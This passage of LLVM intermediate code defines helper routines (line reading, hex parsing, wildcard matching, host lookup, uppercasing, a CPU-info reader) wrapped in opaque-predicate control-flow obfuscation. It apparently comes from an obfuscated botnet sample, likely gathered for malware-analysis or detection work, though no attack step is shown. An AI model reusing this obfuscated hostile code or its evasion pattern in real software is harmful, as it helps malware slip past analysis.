  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %67

; <label>:67:                                     ; preds = %originalBBpart24
  %68 = load i32, i32* %8, align 4
  %69 = icmp eq i32 %68, -1
  br i1 %69, label %70, label %74

; <label>:70:                                     ; preds = %67
  %71 = call i32* @__errno_location() #13
  %72 = load i32, i32* %71, align 4
  %73 = icmp eq i32 %72, 4
  br label %74

; <label>:74:                                     ; preds = %70, %67
  %75 = phi i1 [ false, %67 ], [ %73, %70 ]
  br i1 %75, label %44, label %76

; <label>:76:                                     ; preds = %74
  %77 = load i32, i32* @x.21
  %78 = load i32, i32* @y.22
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %76
  %85 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %86 = load i32*, i32** @fdopen_pids, align 8
  %87 = load i32, i32* %4, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i32, i32* %86, i64 %88
  store i32 0, i32* %89, align 4
  %90 = load i32, i32* %8, align 4
  %91 = icmp eq i32 %90, -1
  %92 = load i32, i32* @x.21
  %93 = load i32, i32* @y.22
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %91, label %100, label %117

; <label>:100:                                    ; preds = %originalBBpart28
  %101 = load i32, i32* @x.21
  %102 = load i32, i32* @y.22
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %100
  %109 = load i32, i32* @x.21
  %110 = load i32, i32* @y.22
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %124

; <label>:117:                                    ; preds = %originalBBpart28
  %118 = bitcast %struct.in_addr* %9 to i32*
  %119 = load i32, i32* %7, align 4
  store i32 %119, i32* %118, align 4
  %120 = bitcast %struct.in_addr* %9 to i32*
  %121 = load i32, i32* %120, align 4
  %122 = and i32 %121, 65280
  %123 = ashr i32 %122, 8
  br label %124

; <label>:124:                                    ; preds = %117, %originalBBpart212
  %125 = phi i32 [ -1, %originalBBpart212 ], [ %123, %117 ]
  store i32 %125, i32* %2, align 4
  br label %126

; <label>:126:                                    ; preds = %124, %19
  %127 = load i32, i32* %2, align 4
  ret i32 %127

originalBBalteredBB:                              ; preds = %originalBB, %20
  %128 = load i32, i32* %3, align 4
  %129 = call i32 @close(i32 %128)
  %130 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %131 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %132 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %133 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %134 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %44
  %135 = load i32*, i32** @fdopen_pids, align 8
  %136 = load i32, i32* %3, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds i32, i32* %135, i64 %137
  %139 = load i32, i32* %138, align 4
  %140 = call i32 @waitpid(i32 %139, i32* %7, i32 0)
  store i32 %140, i32* %8, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %76
  %141 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %142 = load i32*, i32** @fdopen_pids, align 8
  %143 = load i32, i32* %4, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds i32, i32* %142, i64 %144
  store i32 0, i32* %145, align 4
  %146 = load i32, i32* %8, align 4
  %147 = icmp eq i32 %146, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %100
  br label %originalBB10
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %59, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %57

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* @x.23
  %14 = load i32, i32* @y.24
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %12
  %21 = load i32, i32* %8, align 4
  %22 = load i32, i32* %5, align 4
  %23 = icmp slt i32 %21, %22
  %24 = load i32, i32* @x.23
  %25 = load i32, i32* @y.24
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %23, label %32, label %57

; <label>:32:                                     ; preds = %originalBBpart2
  %33 = load i32, i32* @x.23
  %34 = load i32, i32* @y.24
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %32
  %41 = load i8*, i8** %4, align 8
  %42 = load i32, i32* %8, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds i8, i8* %41, i64 %43
  %45 = getelementptr inbounds i8, i8* %44, i64 -1
  %46 = load i8, i8* %45, align 1
  %47 = zext i8 %46 to i32
  %48 = icmp ne i32 %47, 10
  %49 = load i32, i32* @x.23
  %50 = load i32, i32* @y.24
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %57

; <label>:57:                                     ; preds = %originalBBpart24, %originalBBpart2, %9
  %58 = phi i1 [ false, %originalBBpart2 ], [ false, %9 ], [ %48, %originalBBpart24 ]
  br i1 %58, label %59, label %69

; <label>:59:                                     ; preds = %57
  %60 = load i32, i32* %6, align 4
  %61 = load i8*, i8** %4, align 8
  %62 = load i32, i32* %8, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds i8, i8* %61, i64 %63
  %65 = call i64 @read(i32 %60, i8* %64, i64 1)
  %66 = trunc i64 %65 to i32
  store i32 %66, i32* %7, align 4
  %67 = load i32, i32* %8, align 4
  %68 = add nsw i32 %67, 1
  store i32 %68, i32* %8, align 4
  br label %9

; <label>:69:                                     ; preds = %57
  %70 = load i32, i32* %7, align 4
  %71 = icmp eq i32 %70, 0
  br i1 %71, label %72, label %73

; <label>:72:                                     ; preds = %69
  br label %75

; <label>:73:                                     ; preds = %69
  %74 = load i8*, i8** %4, align 8
  br label %75

; <label>:75:                                     ; preds = %73, %72
  %76 = phi i8* [ null, %72 ], [ %74, %73 ]
  ret i8* %76

originalBBalteredBB:                              ; preds = %originalBB, %12
  %77 = load i32, i32* %8, align 4
  %78 = load i32, i32* %5, align 4
  %79 = icmp slt i32 %77, %78
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %32
  %80 = load i8*, i8** %4, align 8
  %81 = load i32, i32* %8, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i8, i8* %80, i64 %82
  %84 = getelementptr inbounds i8, i8* %83, i64 -1
  %85 = load i8, i8* %84, align 1
  %86 = zext i8 %85 to i32
  %87 = icmp ne i32 %86, 10
  br label %originalBB1
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

; <label>:4:                                      ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

; <label>:9:                                      ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

; <label>:12:                                     ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %24

; <label>:14:                                     ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = or i64 %16, %22
  store i64 %23, i64* %3, align 8
  br label %4

; <label>:24:                                     ; preds = %12
  %25 = load i64, i64* %3, align 8
  ret i64 %25
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %134 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %85
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %156

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %65

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %47

; <label>:24:                                     ; preds = %19
  %25 = load i32, i32* @x.27
  %26 = load i32, i32* @y.28
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %24
  %33 = load i8*, i8** %4, align 8
  %34 = load i8*, i8** %5, align 8
  %35 = getelementptr inbounds i8, i8* %34, i64 1
  %36 = call i32 @wildString(i8* %33, i8* %35)
  %37 = icmp ne i32 %36, 0
  %38 = xor i1 %37, true
  %39 = load i32, i32* @x.27
  %40 = load i32, i32* @y.28
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %47

; <label>:47:                                     ; preds = %originalBBpart2, %19
  %48 = phi i1 [ false, %19 ], [ %38, %originalBBpart2 ]
  %49 = load i32, i32* @x.27
  %50 = load i32, i32* @y.28
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %47
  %57 = load i32, i32* @x.27
  %58 = load i32, i32* @y.28
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %65

; <label>:65:                                     ; preds = %originalBBpart216, %13
  %66 = phi i1 [ true, %13 ], [ %48, %originalBBpart216 ]
  %67 = load i32, i32* @x.27
  %68 = load i32, i32* @y.28
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %65
  %75 = xor i1 %66, true
  %76 = zext i1 %75 to i32
  store i32 %76, i32* %3, align 4
  %77 = load i32, i32* @x.27
  %78 = load i32, i32* @y.28
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart221, label %originalBB18alteredBB

originalBBpart221:                                ; preds = %originalBB18
  br label %156

; <label>:85:                                     ; preds = %2
  %86 = load i8*, i8** %5, align 8
  %87 = load i8, i8* %86, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp ne i32 %88, 0
  br i1 %89, label %90, label %114

; <label>:90:                                     ; preds = %85
  %91 = load i32, i32* @x.27
  %92 = load i32, i32* @y.28
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %90
  %99 = load i8*, i8** %4, align 8
  %100 = getelementptr inbounds i8, i8* %99, i64 1
  %101 = load i8*, i8** %5, align 8
  %102 = getelementptr inbounds i8, i8* %101, i64 1
  %103 = call i32 @wildString(i8* %100, i8* %102)
  %104 = icmp ne i32 %103, 0
  %105 = xor i1 %104, true
  %106 = load i32, i32* @x.27
  %107 = load i32, i32* @y.28
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBBpart236, label %originalBB23alteredBB

originalBBpart236:                                ; preds = %originalBB23
  br label %114

; <label>:114:                                    ; preds = %originalBBpart236, %85
  %115 = phi i1 [ false, %85 ], [ %105, %originalBBpart236 ]
  %116 = load i32, i32* @x.27
  %117 = load i32, i32* @y.28
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %114
  %124 = xor i1 %115, true
  %125 = zext i1 %124 to i32
  store i32 %125, i32* %3, align 4
  %126 = load i32, i32* @x.27
  %127 = load i32, i32* @y.28
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart241, label %originalBB38alteredBB

originalBBpart241:                                ; preds = %originalBB38
  br label %156

; <label>:134:                                    ; preds = %2
  %135 = load i8*, i8** %4, align 8
  %136 = load i8, i8* %135, align 1
  %137 = zext i8 %136 to i32
  %138 = call i32 @toupper(i32 %137) #10
  %139 = load i8*, i8** %5, align 8
  %140 = load i8, i8* %139, align 1
  %141 = zext i8 %140 to i32
  %142 = call i32 @toupper(i32 %141) #10
  %143 = icmp eq i32 %138, %142
  br i1 %143, label %144, label %152

; <label>:144:                                    ; preds = %134
  %145 = load i8*, i8** %4, align 8
  %146 = getelementptr inbounds i8, i8* %145, i64 1
  %147 = load i8*, i8** %5, align 8
  %148 = getelementptr inbounds i8, i8* %147, i64 1
  %149 = call i32 @wildString(i8* %146, i8* %148)
  %150 = icmp ne i32 %149, 0
  %151 = xor i1 %150, true
  br label %152

; <label>:152:                                    ; preds = %144, %134
  %153 = phi i1 [ false, %134 ], [ %151, %144 ]
  %154 = xor i1 %153, true
  %155 = zext i1 %154 to i32
  store i32 %155, i32* %3, align 4
  br label %156

; <label>:156:                                    ; preds = %152, %originalBBpart241, %originalBBpart221, %9
  %157 = load i32, i32* %3, align 4
  ret i32 %157

originalBBalteredBB:                              ; preds = %originalBB, %24
  %158 = load i8*, i8** %4, align 8
  %159 = load i8*, i8** %5, align 8
  %160 = getelementptr inbounds i8, i8* %159, i64 1
  %161 = call i32 @wildString(i8* %158, i8* %160)
  %162 = icmp ne i32 %161, 0
  %_ = sub i1 false, %162
  %gen = add i1 %_, true
  %_1 = sub i1 false, %162
  %gen2 = add i1 %_1, true
  %_3 = sub i1 %162, true
  %gen4 = mul i1 %_3, true
  %_5 = sub i1 false, %162
  %gen6 = add i1 %_5, true
  %_7 = sub i1 false, %162
  %gen8 = add i1 %_7, true
  %_9 = shl i1 %162, true
  %_10 = sub i1 %162, true
  %gen11 = mul i1 %_10, true
  %_12 = sub i1 false, %162
  %gen13 = add i1 %_12, true
  %163 = xor i1 %162, true
  br label %originalBB

originalBB14alteredBB:                            ; preds = %originalBB14, %47
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %65
  %_19 = shl i1 %66, true
  %164 = xor i1 %66, true
  %165 = zext i1 %164 to i32
  store i32 %165, i32* %3, align 4
  br label %originalBB18

originalBB23alteredBB:                            ; preds = %originalBB23, %90
  %166 = load i8*, i8** %4, align 8
  %167 = getelementptr inbounds i8, i8* %166, i64 1
  %168 = load i8*, i8** %5, align 8
  %169 = getelementptr inbounds i8, i8* %168, i64 1
  %170 = call i32 @wildString(i8* %167, i8* %169)
  %171 = icmp ne i32 %170, 0
  %_24 = sub i1 %171, true
  %gen25 = mul i1 %_24, true
  %_26 = shl i1 %171, true
  %_27 = sub i1 false, %171
  %gen28 = add i1 %_27, true
  %_29 = sub i1 %171, true
  %gen30 = mul i1 %_29, true
  %_31 = sub i1 false, %171
  %gen32 = add i1 %_31, true
  %_33 = shl i1 %171, true
  %_34 = shl i1 %171, true
  %172 = xor i1 %171, true
  br label %originalBB23

originalBB38alteredBB:                            ; preds = %originalBB38, %114
  %_39 = shl i1 %115, true
  %173 = xor i1 %115, true
  %174 = zext i1 %173 to i32
  store i32 %174, i32* %3, align 4
  br label %originalBB38
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %29

; <label>:12:                                     ; preds = %2
  %13 = load i32, i32* @x.29
  %14 = load i32, i32* @y.30
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %12
  store i32 1, i32* %3, align 4
  %21 = load i32, i32* @x.29
  %22 = load i32, i32* @y.30
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %30

; <label>:29:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %30

; <label>:30:                                     ; preds = %29, %originalBBpart2
  %31 = load i32, i32* %3, align 4
  ret i32 %31

originalBBalteredBB:                              ; preds = %originalBB, %12
  store i32 1, i32* %3, align 4
  br label %originalBB
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = load i32, i32* @x.31
  %3 = load i32, i32* @y.32
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  store i8* %0, i8** %10, align 8
  %11 = load i32, i32* @x.31
  %12 = load i32, i32* @y.32
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %19

; <label>:19:                                     ; preds = %39, %originalBBpart2
  %20 = load i32, i32* @x.31
  %21 = load i32, i32* @y.32
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %19
  %28 = load i8*, i8** %10, align 8
  %29 = load i8, i8* %28, align 1
  %30 = icmp ne i8 %29, 0
  %31 = load i32, i32* @x.31
  %32 = load i32, i32* @y.32
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %30, label %39, label %48

; <label>:39:                                     ; preds = %originalBBpart24
  %40 = load i8*, i8** %10, align 8
  %41 = load i8, i8* %40, align 1
  %42 = zext i8 %41 to i32
  %43 = call i32 @toupper(i32 %42) #10
  %44 = trunc i32 %43 to i8
  %45 = load i8*, i8** %10, align 8
  store i8 %44, i8* %45, align 1
  %46 = load i8*, i8** %10, align 8
  %47 = getelementptr inbounds i8, i8* %46, i32 1
  store i8* %47, i8** %10, align 8
  br label %19

; <label>:48:                                     ; preds = %originalBBpart24
  %49 = load i32, i32* @x.31
  %50 = load i32, i32* @y.32
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %48
  %57 = load i32, i32* @x.31
  %58 = load i32, i32* @y.32
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %65 = alloca i8*, align 8
  store i8* %0, i8** %65, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %19
  %66 = load i8*, i8** %10, align 8
  %67 = load i8, i8* %66, align 1
  %68 = icmp ne i8 %67, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %48
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.132, i32 0, i32 0), i32 0)
  store i32 %7, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %194, %1
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %196

; <label>:13:                                     ; preds = %8
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %14)
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %16 = call i8* @strstr(i8* %15, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.133, i32 0, i32 0)) #10
  %17 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %18 = icmp eq i8* %16, %17
  br i1 %18, label %19, label %194

; <label>:19:                                     ; preds = %13
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %21 = getelementptr inbounds i8, i8* %20, i64 8
  store i8* %21, i8** %6, align 8
  br label %22

; <label>:22:                                     ; preds = %originalBBpart24, %19
  %23 = load i32, i32* @x.33
  %24 = load i32, i32* @y.34
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %22
  %31 = load i8*, i8** %6, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 32
  %35 = load i32, i32* @x.33
  %36 = load i32, i32* @y.34
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %34, label %53, label %43

; <label>:43:                                     ; preds = %originalBBpart2
  %44 = load i8*, i8** %6, align 8
  %45 = load i8, i8* %44, align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 9
  br i1 %47, label %53, label %48

; <label>:48:                                     ; preds = %43
  %49 = load i8*, i8** %6, align 8
  %50 = load i8, i8* %49, align 1
  %51 = zext i8 %50 to i32
  %52 = icmp eq i32 %51, 58
  br label %53

; <label>:53:                                     ; preds = %48, %43, %originalBBpart2
  %54 = phi i1 [ true, %43 ], [ true, %originalBBpart2 ], [ %52, %48 ]
  br i1 %54, label %55, label %74

; <label>:55:                                     ; preds = %53
  %56 = load i32, i32* @x.33
  %57 = load i32, i32* @y.34
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %55
  %64 = load i8*, i8** %6, align 8
  %65 = getelementptr inbounds i8, i8* %64, i32 1
  store i8* %65, i8** %6, align 8
  %66 = load i32, i32* @x.33
  %67 = load i32, i32* @y.34
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
